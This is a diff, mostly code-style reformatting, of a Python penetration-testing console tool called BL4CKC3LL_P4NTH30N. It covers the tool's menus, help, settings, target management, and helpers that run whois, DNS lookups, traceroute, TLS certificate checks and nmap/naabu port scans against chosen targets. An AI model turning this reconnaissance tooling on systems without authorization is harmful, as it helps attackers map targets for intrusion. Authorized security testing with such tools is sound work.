-7188,129 +8999,141 @@\n     print(\"\\033[94m24. [BCAR] BCAR Enhanced Reconnaissance\\033[0m\")\n     print(\"\\033[94m25. [TAKEOVER] Advanced Subdomain Takeover\\033[0m\")\n     print(\"\\033[94m26. [PAYINJECT] Automated Payload Injection\\033[0m\")\n     print(\"\\033[94m27. [FUZZ] Comprehensive Advanced Fuzzing\\033[0m\")\n     print(\"\\033[91m28. [EXIT] Exit\\033[0m\")\n-    print(\"\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n+    print(\"\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n+\n \n def get_choice() -> int:\n     \"\"\"Enhanced choice input with help and shortcuts\"\"\"\n     try:\n         while True:\n             prompt = \"\\n\\033[93mSelect (1-28)\\033[0m\"\n             prompt += \"\\033[90m [h=help, s=status, q=quit]: \\033[0m\"\n             s = input(prompt).strip().lower()\n-            \n+\n             # Handle shortcuts\n-            if s in ['h', 'help']:\n+            if s in [\"h\", \"help\"]:\n                 show_enhanced_help()\n                 continue\n-            elif s in ['s', 'status']:\n+            elif s in [\"s\", \"status\"]:\n                 show_quick_status()\n                 continue\n-            elif s in ['q', 'quit', 'exit']:\n+            elif s in [\"q\", \"quit\", \"exit\"]:\n                 return 28\n-            elif s == '':\n+            elif s == \"\":\n                 print(\"\\033[91mPlease enter a choice (1-28) or 'h' for help\\033[0m\")\n                 continue\n-            \n+\n             # Handle numeric input\n             if s.isdigit():\n                 n = int(s)\n                 if 1 <= n <= 28:\n                     return n\n                 else:\n                     print(f\"\\033[91mInvalid choice: {n}. Please select 1-28\\033[0m\")\n             else:\n-                print(f\"\\033[91mInvalid input: '{s}'. Please enter a number 1-28 or 'h' for help\\033[0m\")\n-                \n+                print(\n+                    f\"\\033[91mInvalid input: '{s}'. Please enter a number 1-28 or 'h' for help\\033[0m\"\n+                )\n+\n     except (EOFError, KeyboardInterrupt):\n         print(\"\\n\\033[93mReceived interrupt signal. Exiting...\\033[0m\")\n         return 28\n     except Exception as e:\n         logging.warning(f\"Input error: {e}\")\n         print(f\"\\033[91mInput error: {e}\\033[0m\")\n     return 0\n \n+\n def show_enhanced_help():\n     \"\"\"Show enhanced help information\"\"\"\n     print(f\"\\n\\033[96m{'='*80}\\033[0m\")\n     print(\"\\033[96mBL4CKC3LL_P4NTH30N - HELP & QUICK REFERENCE\".center(80) + \"\\033[0m\")\n     print(f\"\\033[96m{'='*80}\\033[0m\")\n-    \n+\n     print(\"\\n\\033[95m\ud83d\udd27 ESSENTIAL OPERATIONS:\\033[0m\")\n     print(\"  1  \u2192 Target Management     | Add/edit authorized targets\")\n-    print(\"  2  \u2192 Refresh Sources       | Update wordlists and sources\")  \n+    print(\"  2  \u2192 Refresh Sources       | Update wordlists and sources\")\n     print(\"  5  \u2192 Full Pipeline         | Complete recon + scan + report\")\n     print(\"  7  \u2192 Generate Report       | Create detailed findings report\")\n     print(\"  23 \u2192 Tool Status           | Check installed security tools\")\n-    \n+\n     print(\"\\n\\033[94m\ud83d\udd0d RECONNAISSANCE & SCANNING:\\033[0m\")\n     print(\"  3  \u2192 Reconnaissance        | Subdomain discovery and enumeration\")\n     print(\"  4  \u2192 Vulnerability Scan    | Security vulnerability assessment\")\n     print(\"  11 \u2192 Network Analysis      | Advanced network scanning\")\n     print(\"  24 \u2192 BCAR Enhanced Recon   | Certificate-based reconnaissance\")\n-    \n+\n     print(\"\\n\\033[93m\u26a1 QUICK SCAN PRESETS:\\033[0m\")\n     print(\"  6  \u2192 Preset Configurations | Fast, thorough, stealth modes\")\n     print(\"  20 \u2192 Automated Chain       | Fully automated testing sequence\")\n-    \n+\n     print(\"\\n\\033[92m\ud83d\udee0\ufe0f  ADVANCED FEATURES:\\033[0m\")\n     print(\"  21 \u2192 TUI Interface         | Terminal User Interface\")\n     print(\"  13 \u2192 AI Analysis           | AI-powered vulnerability analysis\")\n     print(\"  14 \u2192 Cloud Security        | AWS/Azure/GCP security assessment\")\n     print(\"  15 \u2192 API Security          | REST/GraphQL API testing\")\n-    \n+\n     print(\"\\n\\033[91m\ud83d\udd10 SPECIALIZED TESTING:\\033[0m\")\n     print(\"  25 \u2192 Subdomain Takeover    | Advanced takeover detection\")\n     print(\"  26 \u2192 Payload Injection     | Automated payload testing\")\n     print(\"  27 \u2192 Advanced Fuzzing      | Comprehensive fuzzing operations\")\n-    \n+\n     print(\"\\n\\033[90m\ud83d\udca1 QUICK TIPS:\\033[0m\")\n     print(\"  \u2022 First time? Try: 1 \u2192 2 \u2192 5 \u2192 7 (setup targets \u2192 full scan \u2192 report)\")\n     print(\"  \u2022 Tool issues? Use option 23 to check tool status\")\n     print(\"  \u2022 Need help? Type 'h' anytime for this help menu\")\n     print(\"  \u2022 Want to quit? Type 'q' or use option 28\")\n-    \n+\n     print(f\"\\n\\033[96m{'='*80}\\033[0m\")\n+\n \n def show_quick_status():\n     \"\"\"Show quick system status\"\"\"\n     print(f\"\\n\\033[96m{'='*40}\\033[0m\")\n     print(\"\\033[96mQUICK STATUS\".center(40) + \"\\033[0m\")\n     print(f\"\\033[96m{'='*40}\\033[0m\")\n-    \n+\n     # Check targets\n     targets = read_lines(TARGETS)\n     print(f\"\ud83d\udccb Targets configured: \\033[93m{len(targets)}\\033[0m\")\n-    \n+\n     # Check recent runs\n     runs_dir = Path(RUNS_DIR)\n     if runs_dir.exists():\n-        recent_runs = sorted([d for d in runs_dir.iterdir() if d.is_dir()], \n-                           key=lambda x: x.stat().st_mtime, reverse=True)[:3]\n+        recent_runs = sorted(\n+            [d for d in runs_dir.iterdir() if d.is_dir()],\n+            key=lambda x: x.stat().st_mtime,\n+            reverse=True,\n+        )[:3]\n         print(f\"\ud83d\udcca Recent runs: \\033[93m{len(recent_runs)}\\033[0m\")\n         for run in recent_runs:\n-            mtime = datetime.fromtimestamp(run.stat().st_mtime).strftime(\"%Y-%m-%d %H:%M\")\n+            mtime = datetime.fromtimestamp(run.stat().st_mtime).strftime(\n+                \"%Y-%m-%d %H:%M\"\n+            )\n             print(f\"   \u2514\u2500 {run.name} ({mtime})\")\n     else:\n         print(\"\ud83d\udcca Recent runs: \\033[93m0\\033[0m\")\n-    \n+\n     # Quick tool check\n     core_tools = [\"subfinder\", \"httpx\", \"naabu\", \"nuclei\", \"nmap\"]\n     available = sum(1 for tool in core_tools if which(tool))\n     print(f\"\ud83d\udd27 Core tools: \\033[93m{available}/{len(core_tools)}\\033[0m available\")\n-    \n+\n     # Memory usage\n     try:\n         import psutil\n+\n         memory = psutil.virtual_memory()\n         print(f\"\ud83d\udcbe Memory usage: \\033[93m{memory.percent:.1f}%\\033[0m\")\n     except ImportError:\n         print(\"\ud83d\udcbe Memory usage: \\033[90mN/A\\033[0m\")\n-    \n+\n     print(f\"\\033[96m{'='*40}\\033[0m\")\n+\n \n def run_full_pipeline():\n     \"\"\"Run the complete pipeline: recon -> vuln scan -> report\"\"\"\n     cfg = load_cfg()\n     env = env_with_lists()\n@@ -7345,16 +9168,17 @@\n                     logger.log(f\"[REPORT] View report at: {html_report}\", \"INFO\")\n \n     finally:\n         cleanup_resource_monitor(stop_event, th)\n \n+\n def settings_menu():\n     \"\"\"Enhanced settings and configuration menu\"\"\"\n     while True:\n-        print(\"\\n\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n+        print(\"\\n\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n         print(\"\\033[91m\" + \"SETTINGS & CONFIGURATION\".center(80) + \"\\033[0m\")\n-        print(\"\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n+        print(\"\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n         print(\"\\033[93m1. [TECH] View Current Configuration\\033[0m\")\n         print(\"\\033[93m2. \u2699\ufe0f Scan Settings\\033[0m\")\n         print(\"\\033[93m3. [REPORT] Report Settings\\033[0m\")\n         print(\"\\033[93m4. \ud83c\udf10 Network Settings\\033[0m\")\n         print(\"\\033[93m5. [SECURITY] Security Settings\\033[0m\")\n@@ -7382,11 +9206,16 @@\n \n             elif choice == \"5\":\n                 configure_security_settings(cfg)\n \n             elif choice == \"6\":\n-                if input(\"\\n[WARNING] Reset all settings to defaults? (yes/no): \").lower() == \"yes\":\n+                if (\n+                    input(\n+                        \"\\n[WARNING] Reset all settings to defaults? (yes/no): \"\n+                    ).lower()\n+                    == \"yes\"\n+                ):\n                     save_cfg(DEFAULT_CFG)\n                     logger.log(\"Configuration reset to defaults\", \"SUCCESS\")\n \n             elif choice == \"7\":\n                 save_cfg(cfg)\n@@ -7395,10 +9224,11 @@\n             elif choice == \"8\":\n                 break\n \n         except Exception as e:\n             logger.log(f\"Settings error: {e}\", \"ERROR\")\n+\n \n def configure_scan_settings(cfg: Dict[str, Any]):\n     \"\"\"Configure scanning-related settings\"\"\"\n     print(\"\\n\\033[96m=== Scan Settings ===\\033[0m\")\n \n@@ -7428,24 +9258,29 @@\n             (\"ssl_analysis\", \"SSL/TLS Analysis\"),\n             (\"dns_enumeration\", \"DNS Enumeration\"),\n             (\"technology_detection\", \"Technology Detection\"),\n             (\"subdomain_takeover\", \"Subdomain Takeover Check\"),\n             (\"cors_analysis\", \"CORS Analysis\"),\n-            (\"security_headers\", \"Security Headers Check\")\n+            (\"security_headers\", \"Security Headers Check\"),\n         ]:\n             current = cfg[\"advanced_scanning\"].get(key, True)\n-            response = input(f\"{description} ({'enabled' if current else 'disabled'}) [y/n]: \").strip().lower()\n-            if response in ['y', 'yes']:\n+            response = (\n+                input(f\"{description} ({'enabled' if current else 'disabled'}) [y/n]: \")\n+                .strip()\n+                .lower()\n+            )\n+            if response in [\"y\", \"yes\"]:\n                 cfg[\"advanced_scanning\"][key] = True\n-            elif response in ['n', 'no']:\n+            elif response in [\"n\", \"no\"]:\n                 cfg[\"advanced_scanning\"][key] = False\n \n         save_cfg(cfg)\n         logger.log(\"Scan settings updated\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Error updating scan settings: {e}\", \"ERROR\")\n+\n \n def configure_report_settings(cfg: Dict[str, Any]):\n     \"\"\"Configure reporting settings\"\"\"\n     print(\"\\n\\033[96m=== Report Settings ===\\033[0m\")\n \n@@ -7454,32 +9289,39 @@\n         current_formats = cfg[\"report\"][\"formats\"]\n         print(f\"Current formats: {', '.join(current_formats)}\")\n         print(\"Available: html, json, csv, sari\")\n         new_formats = input(\"Report formats (comma-separated): \").strip()\n         if new_formats:\n-            cfg[\"report\"][\"formats\"] = [f.strip() for f in new_formats.split(',')]\n+            cfg[\"report\"][\"formats\"] = [f.strip() for f in new_formats.split(\",\")]\n \n         # Auto-open HTML\n         current_auto_open = cfg[\"report\"][\"auto_open_html\"]\n-        response = input(f\"Auto-open HTML report ({'yes' if current_auto_open else 'no'}) [y/n]: \").strip().lower()\n-        if response in ['y', 'yes']:\n+        response = (\n+            input(\n+                f\"Auto-open HTML report ({'yes' if current_auto_open else 'no'}) [y/n]: \"\n+            )\n+            .strip()\n+            .lower()\n+        )\n+        if response in [\"y\", \"yes\"]:\n             cfg[\"report\"][\"auto_open_html\"] = True\n-        elif response in ['n', 'no']:\n+        elif response in [\"n\", \"no\"]:\n             cfg[\"report\"][\"auto_open_html\"] = False\n \n         # Risk scoring\n         response = input(\"Enable risk scoring [y/n]: \").strip().lower()\n-        if response in ['y', 'yes']:\n+        if response in [\"y\", \"yes\"]:\n             cfg[\"report\"][\"risk_scoring\"] = True\n-        elif response in ['n', 'no']:\n+        elif response in [\"n\", \"no\"]:\n             cfg[\"report\"][\"risk_scoring\"] = False\n \n         save_cfg(cfg)\n         logger.log(\"Report settings updated\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Error updating report settings: {e}\", \"ERROR\")\n+\n \n def configure_network_settings(cfg: Dict[str, Any]):\n     \"\"\"Configure network analysis settings\"\"\"\n     print(\"\\n\\033[96m=== Network Settings ===\\033[0m\")\n \n@@ -7487,49 +9329,58 @@\n         for key, description in [\n             (\"traceroute\", \"Traceroute Analysis\"),\n             (\"whois_lookup\", \"WHOIS Lookup\"),\n             (\"reverse_dns\", \"Reverse DNS Lookup\"),\n             (\"asn_lookup\", \"ASN Lookup\"),\n-            (\"geolocation\", \"Geolocation Analysis\")\n+            (\"geolocation\", \"Geolocation Analysis\"),\n         ]:\n             current = cfg[\"network_analysis\"].get(key, True)\n-            response = input(f\"{description} ({'enabled' if current else 'disabled'}) [y/n]: \").strip().lower()\n-            if response in ['y', 'yes']:\n+            response = (\n+                input(f\"{description} ({'enabled' if current else 'disabled'}) [y/n]: \")\n+                .strip()\n+                .lower()\n+            )\n+            if response in [\"y\", \"yes\"]:\n                 cfg[\"network_analysis\"][key] = True\n-            elif response in ['n', 'no']:\n+            elif response in [\"n\", \"no\"]:\n                 cfg[\"network_analysis\"][key] = False\n \n         save_cfg(cfg)\n         logger.log(\"Network settings updated\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Error updating network settings: {e}\", \"ERROR\")\n+\n \n def configure_security_settings(cfg: Dict[str, Any]):\n     \"\"\"Configure security-related settings\"\"\"\n     print(\"\\n\\033[96m=== Security Settings ===\\033[0m\")\n \n     try:\n         # Fuzzing settings\n         for key, description in [\n             (\"enable_dirb\", \"Directory Brute Force (dirb)\"),\n             (\"enable_gobuster\", \"Directory Brute Force (gobuster)\"),\n-            (\"enable_ffu\", \"Fast Web Fuzzer (ffuf)\")\n+            (\"enable_ffu\", \"Fast Web Fuzzer (ffuf)\"),\n         ]:\n             current = cfg[\"fuzzing\"].get(key, True)\n-            response = input(f\"{description} ({'enabled' if current else 'disabled'}) [y/n]: \").strip().lower()\n-            if response in ['y', 'yes']:\n+            response = (\n+                input(f\"{description} ({'enabled' if current else 'disabled'}) [y/n]: \")\n+                .strip()\n+                .lower()\n+            )\n+            if response in [\"y\", \"yes\"]:\n                 cfg[\"fuzzing\"][key] = True\n-            elif response in ['n', 'no']:\n+            elif response in [\"n\", \"no\"]:\n                 cfg[\"fuzzing\"][key] = False\n \n         # Resource management\n         print(\"\\n--- Resource Management ---\")\n         for key, description, default in [\n             (\"cpu_threshold\", \"CPU Threshold (%)\", 85),\n             (\"memory_threshold\", \"Memory Threshold (%)\", 90),\n-            (\"disk_threshold\", \"Disk Threshold (%)\", 95)\n+            (\"disk_threshold\", \"Disk Threshold (%)\", 95),\n         ]:\n             current = cfg[\"resource_management\"].get(key, default)\n             new_value = input(f\"{description} ({current}): \").strip()\n             if new_value.isdigit():\n                 cfg[\"resource_management\"][key] = int(new_value)\n@@ -7538,16 +9389,17 @@\n         logger.log(\"Security settings updated\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Error updating security settings: {e}\", \"ERROR\")\n \n+\n def network_tools_menu():\n     \"\"\"Network analysis tools menu\"\"\"\n     while True:\n-        print(\"\\n\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n+        print(\"\\n\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n         print(\"\\033[91m\" + \"NETWORK ANALYSIS TOOLS\".center(80) + \"\\033[0m\")\n-        print(\"\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n+        print(\"\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n         print(\"\\033[93m1. \ud83c\udf10 WHOIS Lookup\\033[0m\")\n         print(\"\\033[93m2. [RECON] DNS Enumeration\\033[0m\")\n         print(\"\\033[93m3. \ud83d\udee3\ufe0f Traceroute Analysis\\033[0m\")\n         print(\"\\033[93m4. \ud83c\udfe2 ASN Lookup\\033[0m\")\n         print(\"\\033[93m5. \ud83d\udd12 SSL Certificate Analysis\\033[0m\")\n@@ -7591,15 +9443,18 @@\n                 break\n \n         except Exception as e:\n             logger.log(f\"Network tools error: {e}\", \"ERROR\")\n \n+\n def perform_whois_lookup(target: str):\n     \"\"\"Perform WHOIS lookup\"\"\"\n     try:\n         if which(\"whois\"):\n-            result = run_cmd([\"whois\", target], capture=True, timeout=60, check_return=False)\n+            result = run_cmd(\n+                [\"whois\", target], capture=True, timeout=60, check_return=False\n+            )\n             if result.stdout:\n                 print(f\"\\n\\033[96m=== WHOIS Information for {target} ===\\033[0m\")\n                 print(result.stdout)\n             else:\n                 logger.log(\"No WHOIS information found\", \"WARNING\")\n@@ -7607,51 +9462,69 @@\n             logger.log(\"whois command not found\", \"ERROR\")\n     except Exception as e:\n         logger.log(f\"WHOIS lookup error: {e}\", \"ERROR\")\n     input(\"\\nPress Enter to continue...\")\n \n+\n def perform_dns_enumeration(domain: str):\n     \"\"\"Perform DNS enumeration\"\"\"\n     record_types = [\"A\", \"AAAA\", \"CNAME\", \"MX\", \"NS\", \"TXT\", \"SOA\"]\n \n     print(f\"\\n\\033[96m=== DNS Records for {domain} ===\\033[0m\")\n \n     for record_type in record_types:\n         try:\n-            result = run_cmd([\"dig\", \"+short\", record_type, domain], capture=True, timeout=30, check_return=False)\n+            result = run_cmd(\n+                [\"dig\", \"+short\", record_type, domain],\n+                capture=True,\n+                timeout=30,\n+                check_return=False,\n+            )\n             if result.stdout and result.stdout.strip():\n                 print(f\"\\033[93m{record_type} Records:\\033[0m\")\n-                for line in result.stdout.strip().split('\\n'):\n+                for line in result.stdout.strip().split(\"\\n\"):\n                     print(f\"  {line}\")\n                 print()\n         except Exception as e:\n             logger.log(f\"DNS lookup error for {record_type}: {e}\", \"WARNING\")\n \n     input(\"Press Enter to continue...\")\n+\n \n def perform_traceroute(target: str):\n     \"\"\"Perform traceroute analysis\"\"\"\n     try:\n         if which(\"traceroute\"):\n             print(f\"\\n\\033[96m=== Traceroute to {target} ===\\033[0m\")\n-            result = run_cmd([\"traceroute\", \"-m\", \"15\", target], capture=True, timeout=120, check_return=False)\n+            result = run_cmd(\n+                [\"traceroute\", \"-m\", \"15\", target],\n+                capture=True,\n+                timeout=120,\n+                check_return=False,\n+            )\n             if result.stdout:\n                 print(result.stdout)\n             else:\n                 logger.log(\"No traceroute output\", \"WARNING\")\n         else:\n             logger.log(\"traceroute command not found\", \"ERROR\")\n     except Exception as e:\n         logger.log(f\"Traceroute error: {e}\", \"ERROR\")\n     input(\"\\nPress Enter to continue...\")\n \n+\n def perform_asn_lookup(ip: str):\n     \"\"\"Perform ASN lookup\"\"\"\n     try:\n         # Use WHOIS for ASN information\n         if which(\"whois\"):\n-            result = run_cmd([\"whois\", \"-h\", \"whois.cymru.com\", f\" -v {ip}\"], capture=True, timeout=30, check_return=False)\n+            result = run_cmd(\n+                [\"whois\", \"-h\", \"whois.cymru.com\", f\" -v {ip}\"],\n+                capture=True,\n+                timeout=30,\n+                check_return=False,\n+            )\n             if result.stdout:\n                 print(f\"\\n\\033[96m=== ASN Information for {ip} ===\\033[0m\")\n                 print(result.stdout)\n             else:\n                 logger.log(\"No ASN information found\", \"WARNING\")\n@@ -7659,60 +9532,81 @@\n             logger.log(\"whois command not found\", \"ERROR\")\n     except Exception as e:\n         logger.log(f\"ASN lookup error: {e}\", \"ERROR\")\n     input(\"\\nPress Enter to continue...\")\n \n+\n def perform_ssl_analysis(target: str):\n     \"\"\"Perform SSL certificate analysis\"\"\"\n     try:\n         if not target.startswith(\"https://\"):\n             target = f\"https://{target}\"\n \n         hostname = target.replace(\"https://\", \"\").split(\"/\")[0]\n \n         print(f\"\\n\\033[96m=== SSL Certificate Analysis for {hostname} ===\\033[0m\")\n \n-        result = run_cmd([\n-            \"openssl\", \"s_client\", \"-connect\", f\"{hostname}:443\",\n-            \"-servername\", hostname, \"-showcerts\"\n-        ], capture=True, timeout=30, check_return=False, use_shell=False)\n+        result = run_cmd(\n+            [\n+                \"openssl\",\n+                \"s_client\",\n+                \"-connect\",\n+                f\"{hostname}:443\",\n+                \"-servername\",\n+                hostname,\n+                \"-showcerts\",\n+            ],\n+            capture=True,\n+            timeout=30,\n+            check_return=False,\n+            use_shell=False,\n+        )\n \n         if result.stdout:\n             # Extract certificate information\n-            lines = result.stdout.split('\\n')\n+            lines = result.stdout.split(\"\\n\")\n             cert_info = False\n             for line in lines:\n                 if \"Certificate chain\" in line:\n                     cert_info = True\n-                if cert_info and (\"subject=\" in line or \"issuer=\" in line or \"verify\" in line):\n+                if cert_info and (\n+                    \"subject=\" in line or \"issuer=\" in line or \"verify\" in line\n+                ):\n                     print(line)\n         else:\n             logger.log(\"No SSL certificate information found\", \"WARNING\")\n \n     except Exception as e:\n         logger.log(f\"SSL analysis error: {e}\", \"ERROR\")\n     input(\"\\nPress Enter to continue...\")\n+\n \n def perform_quick_port_scan(target: str):\n     \"\"\"Perform quick port scan\"\"\"\n     try:\n         hostname = target.replace(\"http://\", \"\").replace(\"https://\", \"\").split(\"/\")[0]\n \n         print(f\"\\n\\033[96m=== Quick Port Scan for {hostname} ===\\033[0m\")\n \n         if which(\"nmap\"):\n-            result = run_cmd([\n-                \"nmap\", \"-F\", \"--open\", hostname\n-            ], capture=True, timeout=120, check_return=False)\n+            result = run_cmd(\n+                [\"nmap\", \"-F\", \"--open\", hostname],\n+                capture=True,\n+                timeout=120,\n+                check_return=False,\n+            )\n             if result.stdout:\n                 print(result.stdout)\n             else:\n                 logger.log(\"No open ports found\", \"WARNING\")\n         elif which(\"naabu\"):\n-            result = run_cmd([\n-                \"naabu\", \"-host\", hostname, \"-top-ports\", \"1000\"\n-            ], capture=True, timeout=120, check_return=False)\n+            result = run_cmd(\n+                [\"naabu\", \"-host\", hostname, \"-top-ports\", \"1000\"],\n+                capture=True,\n+                timeout=120,\n+                check_return=False,\n+            )\n             if result.stdout:\n                 print(result.stdout)\n             else:\n                 logger.log(\"No open ports found\", \"WARNING\")\n         else:\n@@ -7720,14 +9614,19 @@\n \n     except Exception as e:\n         logger.log(f\"Port scan error: {e}\", \"ERROR\")\n     input(\"\\nPress Enter to continue...\")\n \n+\n def security_assessment_summary():\n     \"\"\"Display security assessment summary from latest run\"\"\"\n     try:\n-        runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()], key=lambda p: p.stat().st_mtime, reverse=True)\n+        runs = sorted(\n+            [d for d in RUNS_DIR.iterdir() if d.is_dir()],\n+            key=lambda p: p.stat().st_mtime,\n+            reverse=True,\n+        )\n         if not runs:\n             logger.log(\"No assessment runs found\", \"WARNING\")\n             return\n \n         latest_run = runs[0]\n@@ -7737,71 +9636,84 @@\n             logger.log(\"No report found for latest run\", \"WARNING\")\n             return\n \n         report_data = json.loads(report_file.read_text())\n \n-        print(\"\\n\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n+        print(\"\\n\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n         print(\"\\033[91m\" + \"SECURITY ASSESSMENT SUMMARY\".center(80) + \"\\033[0m\")\n-        print(\"\\033[31m\" + \"=\"*80 + \"\\033[0m\")\n+        print(\"\\033[31m\" + \"=\" * 80 + \"\\033[0m\")\n \n         # Basic stats\n         exec_summary = report_data.get(\"executive_summary\", {})\n         risk_assessment = report_data.get(\"risk_assessment\", {})\n \n         print(f\"\\033[93m[REPORT] Run ID:\\033[0m {report_data.get('run_id', 'Unknown')}\")\n-        print(f\"\\033[93m[TARGET] Targets Scanned:\\033[0m {exec_summary.get('targets_scanned', 0)}\")\n-        print(f\"\\033[93m[RECON] Subdomains Found:\\033[0m {exec_summary.get('subdomains_discovered', 0)}\")\n-        print(f\"\\033[93m[PORTS] Open Ports:\\033[0m {exec_summary.get('open_ports_found', 0)}\")\n-        print(f\"\\033[93m\ud83c\udf10 HTTP Services:\\033[0m {exec_summary.get('http_services_identified', 0)}\")\n+        print(\n+            f\"\\033[93m[TARGET] Targets Scanned:\\033[0m {exec_summary.get('targets_scanned', 0)}\"\n+        )\n+        print(\n+            f\"\\033[93m[RECON] Subdomains Found:\\033[0m {exec_summary.get('subdomains_discovered', 0)}\"\n+        )\n+        print(\n+            f\"\\033[93m[PORTS] Open Ports:\\033[0m {exec_summary.get('open_ports_found', 0)}\"\n+        )\n+        print(\n+            f\"\\033[93m\ud83c\udf10 HTTP Services:\\033[0m {exec_summary.get('http_services_identified', 0)}\"\n+        )\n \n         # Risk assessment\n-        risk_level = risk_assessment.get('risk_level', 'UNKNOWN')\n+        risk_level = risk_assessment.get(\"risk_level\", \"UNKNOWN\")\n         risk_color = {\n-            'CRITICAL': '\\033[91m',  # Red\n-            'HIGH': '\\033[91m',      # Red\n-            'MEDIUM': '\\033[93m',    # Yellow\n-            'LOW': '\\033[92m',       # Green\n-            'INFORMATIONAL': '\\033[94m'  # Blue\n-        }.get(risk_level, '\\033[0m')\n-\n-        print(f\"\\n\\033[93m[SECURITY] Overall Risk Level:\\033[0m {risk_color}{risk_level}\\033[0m\")\n+            \"CRITICAL\": \"\\033[91m\",  # Red\n+            \"HIGH\": \"\\033[91m\",  # Red\n+            \"MEDIUM\": \"\\033[93m\",  # Yellow\n+            \"LOW\": \"\\033[92m\",  # Green\n+            \"INFORMATIONAL\": \"\\033[94m\",  # Blue\n+        }.get(risk_level, \"\\033[0m\")\n+\n+        print(\n+            f\"\\n\\033[93m[SECURITY] Overall Risk Level:\\033[0m {risk_color}{risk_level}\\033[0m\"\n+        )\n \n         # Severity breakdown\n-        severity_counts = risk_assessment.get('severity_breakdown', {})\n+        severity_counts = risk_assessment.get(\"severity_breakdown\", {})\n         if any(severity_counts.values()):\n             print(\"\\n\\033[93m[SUMMARY] Vulnerability Breakdown:\\033[0m\")\n             print(f\"  [ALERT] Critical: {severity_counts.get('critical', 0)}\")\n             print(f\"  \ud83d\udd34 High: {severity_counts.get('high', 0)}\")\n             print(f\"  \ud83d\udfe1 Medium: {severity_counts.get('medium', 0)}\")\n             print(f\"  \ud83d\udfe2 Low: {severity_counts.get('low', 0)}\")\n             print(f\"  \u2139\ufe0f Info: {severity_counts.get('info', 0)}\")\n \n         # Key findings\n-        key_findings = exec_summary.get('key_findings', [])\n+        key_findings = exec_summary.get(\"key_findings\", [])\n         if key_findings:\n             print(\"\\n\\033[93m[RECON] Key Findings:\\033[0m\")\n             for finding in key_findings[:5]:  # Show top 5\n                 print(f\"  \u2022 {finding}\")\n \n         # Recommendations\n-        recommendations = risk_assessment.get('recommendations', [])\n+        recommendations = risk_assessment.get(\"recommendations\", [])\n         if recommendations:\n             print(\"\\n\\033[93m\ud83d\udca1 Top Recommendations:\\033[0m\")\n             for rec in recommendations[:5]:  # Show top 5\n                 print(f\"  \u2022 {rec}\")\n \n-        print(f\"\\n\\033[93m\ud83d\udcc1 Full Report:\\033[0m {latest_run / 'report' / 'report.html'}\")\n+        print(\n+            f\"\\n\\033[93m\ud83d\udcc1 Full Report:\\033[0m {latest_run / 'report' / 'report.html'}\"\n+        )\n \n     except Exception as e:\n         logger.log(f\"Error generating summary: {e}\", \"ERROR\")\n \n     input(\"\\nPress Enter to continue...\")\n \n+\n def manage_targets():\n-    print(\"\\n\\033[96m\" + \"=\"*80 + \"\\033[0m\")\n+    print(\"\\n\\033[96m\" + \"=\" * 80 + \"\\033[0m\")\n     print(\"\\033[96mENHANCED TARGET MANAGEMENT\".center(80) + \"\\033[0m\")\n-    print(\"\\033[96m\" + \"=\"*80 + \"\\033[0m\")\n+    print(\"\\033[96m\" + \"=\" * 80 + \"\\033[0m\")\n     print(\"\\033[95m1. View Current Targets\\033[0m\")\n     print(\"\\033[95m2. Add Single Target\\033[0m\")\n     print(\"\\033[95m3. Add Multiple Targets (Bulk)\\033[0m\")\n     print(\"\\033[95m4. Import from File\\033[0m\")\n     print(\"\\033[95m5. Remove Individual Target\\033[0m\")\n@@ -7834,10 +9746,11 @@\n             return\n     except Exception as e:\n         logger.log(f\"Error in target management: {e}\", \"ERROR\")\n         input(\"Press Enter to continue...\")\n \n+\n def view_current_targets():\n     \"\"\"Display all current targets with enhanced formatting\"\"\"\n     ts = read_lines(TARGETS)\n     if not ts:\n         print(\"\\n\\033[93m  \ud83d\udccb No targets configured.\\033[0m\")\n@@ -7848,10 +9761,11 @@\n             status = validate_single_target(t)\n             status_icon = \"\u2705\" if status else \"\u274c\"\n             print(f\"    {i:2d}. {status_icon} {t}\")\n     input(\"\\nPress Enter to continue...\")\n \n+\n def add_single_target():\n     \"\"\"Add a single target with validation\"\"\"\n     t = input(\"\\n\\033[93mEnter target (domain or URL): \\033[0m\").strip()\n     if t and validate_target_input(t):\n         # Check for duplicates\n@@ -7860,12 +9774,15 @@\n             logger.log(f\"Target '{t}' already exists\", \"WARNING\")\n         else:\n             write_uniq(TARGETS, current_targets + [t])\n             logger.log(f\"\u2705 Target '{t}' added successfully\", \"SUCCESS\")\n     elif t:\n-        logger.log(\"\u274c Invalid target format. Use domain.com or http://domain.com\", \"ERROR\")\n+        logger.log(\n+            \"\u274c Invalid target format. Use domain.com or http://domain.com\", \"ERROR\"\n+        )\n     input(\"Press Enter to continue...\")\n+\n \n def add_multiple_targets():\n     \"\"\"Add multiple targets at once\"\"\"\n     print(\"\\n\\033[93mEnter targets (one per line, empty line to finish):\\033[0m\")\n     targets = []\n@@ -7895,10 +9812,11 @@\n         if duplicates > 0:\n             logger.log(f\"\u26a0\ufe0f Skipped {duplicates} duplicate targets\", \"WARNING\")\n \n     input(\"Press Enter to continue...\")\n \n+\n def import_targets_from_file():\n     \"\"\"Import targets from a file\"\"\"\n     p = input(\"\\n\\033[93mPath to file: \\033[0m\").strip()\n     if p and validate_input(p, {\"max_length\": 500}):\n         fp = Path(p)\n@@ -7916,24 +9834,29 @@\n \n                 if valid_targets:\n                     current_targets = read_lines(TARGETS)\n                     new_targets = [t for t in valid_targets if t not in current_targets]\n                     write_uniq(TARGETS, current_targets + new_targets)\n-                    logger.log(f\"\u2705 Imported {len(new_targets)} valid targets\", \"SUCCESS\")\n+                    logger.log(\n+                        f\"\u2705 Imported {len(new_targets)} valid targets\", \"SUCCESS\"\n+                    )\n \n                     if invalid_count > 0:\n-                        